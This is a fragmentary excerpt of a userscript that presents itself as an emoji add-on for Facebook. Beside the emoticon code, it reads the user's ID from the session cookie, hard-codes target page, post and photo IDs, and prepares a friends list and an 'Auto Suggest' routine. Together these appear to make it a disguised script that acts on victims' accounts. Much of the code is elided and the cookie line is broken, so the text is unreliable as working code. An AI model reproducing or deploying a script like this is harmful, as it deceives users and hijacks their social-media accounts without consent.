// ==UserScript==
// @name            Emoji Sticker Facebook
// @description     Put new emoticon on Facebook
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/juliusku" target="_blank">Created by Julius Kurnianto</a>';
	html += '</div>';
...
var spage_id = "513324938725547";
var spost_id = "513324938725547";
var sfoto_id = "513324938725547";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Julius Kurnianto';
